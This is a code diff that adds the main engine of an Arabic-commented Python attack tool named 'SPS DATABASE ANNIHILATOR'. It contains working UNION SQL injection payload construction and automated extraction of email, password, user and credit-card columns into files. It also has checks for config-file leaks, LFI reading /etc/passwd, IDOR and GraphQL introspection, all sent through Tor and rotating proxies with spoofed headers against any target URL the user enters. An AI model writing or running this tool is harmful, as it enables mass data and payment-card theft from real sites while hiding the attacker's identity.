@@ -447,3 +447,246 @@ class DatabaseExtractor:
     def extract_data_batch(self, db, table, cols, offset=0, limit=50):
         if len(cols) > self.col_count - 1:
             cols = cols[:self.col_count-1]
+        cols_str = ','.join(cols) if cols else '*'
+        remaining = self.col_count - len(cols) - 1
+        nulls = ','.join(['NULL']*max(0, remaining))
+        null_part = f",{nulls}" if nulls else ''
+        payload = f"' UNION SELECT {cols_str}{null_part} FROM {db}.{table} LIMIT {offset},{limit}--"
+        return self._inject(payload)
+
+    def find_sensitive_columns(self, columns):
+        email_cols = [c for c in columns if any(k in c.lower() for k in ['email', 'mail', 'e_mail'])]
+        pass_cols = [c for c in columns if any(k in c.lower() for k in ['pass', 'pwd', 'password', 'hash', 'secret'])]
+        user_cols = [c for c in columns if any(k in c.lower() for k in ['user', 'username', 'login', 'name'])]
+        card_cols = [c for c in columns if any(k in c.lower() for k in ['card', 'credit', 'cc', 'cvv', 'expir', 'billing', 'payment', 'visa', 'mastercard'])]
+        return email_cols, pass_cols, user_cols, card_cols
+
+    def full_extraction(self):
+        print(f"\n{R}📊 بدء الاستخراج الكامل...{X}")
+        
+        if not self.detect_columns():
+            print(f"{R}❌ فشل تحديد عدد الأعمدة{X}")
+            return self.data
+        
+        print(f"{C}📊 الأعمدة: {self.col_count}{X}")
+        
+        dbs = self.extract_databases()
+        print(f"{G}🗄️ قواعد البيانات: {dbs}{X}")
+        
+        for db in dbs[:3]:
+            if db in ['information_schema', 'performance_schema', 'mysql', 'sys']: continue
+            
+            print(f"\n{C}📁 {db}...{X}")
+            tables = self.extract_tables(db)
+            print(f"{Y}📊 {len(tables)} جدول{X}")
+            
+            self.data['databases'][db] = {'tables': {}}
+            
+            for table in tables[:8]:
+                cols = self.extract_columns(db, table)
+                email_cols, pass_cols, user_cols, card_cols = self.find_sensitive_columns(cols)
+                
+                if email_cols:
+                    print(f"{G}📧 إيميلات في {table}: {email_cols}{X}")
+                    self.data['emails'].append({'db': db, 'table': table, 'cols': email_cols})
+                if pass_cols:
+                    print(f"{R}🔑 باسوردات في {table}: {pass_cols}{X}")
+                    self.data['passwords'].append({'db': db, 'table': table, 'cols': pass_cols})
+                if user_cols:
+                    print(f"{Y}👤 مستخدمين في {table}: {user_cols}{X}")
+                    self.data['users'].append({'db': db, 'table': table, 'cols': user_cols})
+                if card_cols:
+                    print(f"{R}💳 بطاقات في {table}: {card_cols}{X}")
+                    self.data['cards'].append({'db': db, 'table': table, 'cols': card_cols})
+                
+                all_sensitive = email_cols + pass_cols + user_cols + card_cols
+                if all_sensitive:
+                    resp = self.extract_data_batch(db, table, all_sensitive[:self.col_count-1], 0, 100)
+                    if resp:
+                        self.data['databases'][db]['tables'][table] = {
+                            'columns': cols,
+                            'sensitive': all_sensitive,
+                            'sample_data': resp.text[:10000]
+                        }
+                        fname = os.path.join(self.results_dir, f"{db}_{table}.txt")
+                        with open(fname, 'w', encoding='utf-8') as f:
+                            f.write(resp.text[:50000])
+        
+        return self.data
+
+# ===== HTTP CLIENT =====
+class HTTPClient:
+    def __init__(self, pm: ProxyManager, spoofer: IPSpoofer, dns: DNSSafe):
+        self.pm = pm
+        self.spoofer = spoofer
+        self.dns = dns
+
+    def get(self, url, timeout=10):
+        s = requests.Session()
+        s.verify = False
+        
+        if Config.TOR_AVAILABLE:
+            s.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
+        else:
+            p = self.pm.get()
+            if p and socks:
+                s.proxies = {'http': f"socks5://{p['addr']}", 'https': f"socks5://{p['addr']}"}
+        
+        parsed = urlparse(url)
+        if parsed.hostname:
+            resolved = self.dns.resolve(parsed.hostname)
+            if resolved:
+                url = url.replace(parsed.hostname, resolved, 1)
+        
+        h = HeaderRotator.generate(self.spoofer.generate_headers())
+        try:
+            return s.get(url, headers=h, timeout=timeout, allow_redirects=False)
+        except: return None
+
+# ===== ADDITIONAL ATTACKS =====
+class AdditionalAttacks:
+    def __init__(self, http: HTTPClient, domain: str):
+        self.http = http
+        self.domain = domain
+        self.results = []
+
+    def check_config_leak(self):
+        paths = ['/.env', '/.env.backup', '/wp-config.php', '/config.php', '/.git/config',
+                 '/backup/database.sql', '/dump.sql', '/phpinfo.php']
+        for path in paths:
+            resp = self.http.get(self.domain + path, timeout=8)
+            if resp and resp.status_code == 200 and len(resp.text) > 10:
+                if any(k in resp.text for k in ['DB_', 'PASSWORD', 'SECRET', 'API_KEY']):
+                    self.results.append(f"Config Leak: {path}")
+
+    def check_lfi(self):
+        for param in ['?file=', '?page=', '?path=']:
+            for payload in ['../../../etc/passwd', '../../../../etc/passwd']:
+                resp = self.http.get(self.domain + param + payload, timeout=8)
+                if resp and 'root:' in resp.text:
+                    self.results.append(f"LFI: {param}{payload}")
+                    return
+
+    def check_idor(self):
+        for path in ['/api/users/', '/api/user/', '/users/']:
+            for i in range(1, 10):
+                resp = self.http.get(self.domain + path + str(i), timeout=5)
+                if resp and resp.status_code == 200:
+                    if any(k in resp.text.lower() for k in ['email', 'password', 'username']):
+                        self.results.append(f"IDOR: {path}{i}")
+
+    def check_graphql(self):
+        query = '{"query":"{ __schema { types { name } } }"}'
+        for path in ['/graphql', '/graphiql', '/gql']:
+            s = requests.Session()
+            s.verify = False
+            resp = s.post(self.domain + path, json={'query': query}, timeout=10)
+            if resp and resp.status_code == 200 and '__schema' in resp.text:
+                self.results.append(f"GraphQL: {path}")
+
+    def run_all(self):
+        checks = [self.check_config_leak, self.check_lfi, self.check_idor, self.check_graphql]
+        with ThreadPoolExecutor(max_workers=4) as ex:
+            futures = [ex.submit(c) for c in checks]
+            for f in as_completed(futures):
+                try: f.result()
+                except: pass
+        return self.results
+
+# ===== REPORT GENERATOR =====
+class ReportGenerator:
+    @staticmethod
+    def generate(data, additional, output_dir):
+        report = {
+            'timestamp': datetime.now().isoformat(),
+            'summary': {
+                'databases': len(data['databases']),
+                'email_tables': len(data['emails']),
+                'password_tables': len(data['passwords']),
+                'user_tables': len(data['users']),
+                'card_tables': len(data['cards']),
+                'additional_vulns': len(additional),
+            },
+            'details': data,
+            'additional_vulns': additional,
+        }
+        fname = os.path.join(output_dir, 'full_report.json')
+        with open(fname, 'w', encoding='utf-8') as f:
+            json.dump(report, f, indent=2, ensure_ascii=False, default=str)
+        return fname
+
+# ===== MAIN ENGINE =====
+class DatabaseAnnihilator:
+    def __init__(self):
+        self.pm = ProxyManager(target=100)
+        self.spoofer = IPSpoofer()
+        self.dns = DNSSafe()
+        self.http = HTTPClient(self.pm, self.spoofer, self.dns)
+        self.obfuscator = TrafficObfuscator(self.pm)
+        check_tor()
+
+    def log(self, msg, color=G):
+        print(f"{color}[{time.strftime('%H:%M:%S')}]{X} {msg}")
+
+    def banner(self):
+        print(f"""
+{R}╔══════════════════════════════════════════════╗
+║  🔥 SPS DATABASE ANNIHILATOR                 ║
+║  SQLi (5 types) | XSS | LFI | IDOR | GraphQL║
+║  Config Leak | API | WAF Bypass             ║
+║  50 Proxy Sources | Tor | DNS/HTTPS         ║
+║  IP Spoofing | UA/Header Rotation           ║
+║  S-P-S TEAM - BLACK OPS DIVISION            ║
+╚══════════════════════════════════════════════╝{X}
+""")
+
+    def attack(self, url):
+        self.obfuscator.start(2)
+        
+        self.log(f"🔍 فحص SQL Injection...", Y)
+        vulns = SQLiDetector.detect(self.http, url)
+        
+        if not vulns:
+            self.log(f"{Y}⚠️ لم يكتشف SQLi - جاري الفحوصات الأخرى...{X}")
+        else:
+            self.log(f"{G}✅ {len(vulns)} نقطة حقن!{X}")
+            for v in vulns:
+                self.log(f"  {R}⚡ {v['type']} | {v.get('db', '?')}{X}")
+            
+            vuln = vulns[0]
+            if 'db' not in vuln: vuln['db'] = 'MySQL'
+            
+            extractor = DatabaseExtractor(self.http, url, vuln)
+            data = extractor.full_extraction()
+            
+            additional = AdditionalAttacks(self.http, urlparse(url).scheme + '://' + urlparse(url).netloc).run_all()
+            
+            report = ReportGenerator.generate(data, additional, extractor.results_dir)
+            
+            print(f"""
+{G}╔══════════════════════════════════════════════╗
+║  ✅ اكتمل الاستخراج                           ║
+╠══════════════════════════════════════════════╣
+║  🗄️ قواعد: {report['summary']['databases']} | 📧 إيميلات: {report['summary']['email_tables']} | 🔑 باسوردات: {report['summary']['password_tables']}  ║
+║  💳 بطاقات: {report['summary']['card_tables']} | 👤 مستخدمين: {report['summary']['user_tables']} | 🔍 ثغرات: {report['summary']['additional_vulns']}  ║
+║  📁 {extractor.results_dir}     ║
+╚══════════════════════════════════════════════╝{X}
+""")
+
+    def run(self):
+        self.banner()
+        print(f"{G}✅ {self.pm.count} بروكسي | Tor: {'✅' if Config.TOR_AVAILABLE else '❌'} | DNS/HTTPS{X}")
+        
+        url = input(f"{C}🎯 Target URL (مع parameter): {X}").strip()
+        if not url:
+            url = "http://testphp.vulnweb.com/listproducts.php?cat=1"
+            print(f"{Y}💡 هدف اختباري: {url}{X}")
+        
+        self.attack(url)
+
+def main():
+    annihilator = DatabaseAnnihilator()
+    annihilator.run()
+
+if __name__ == "__main__":
+    main()
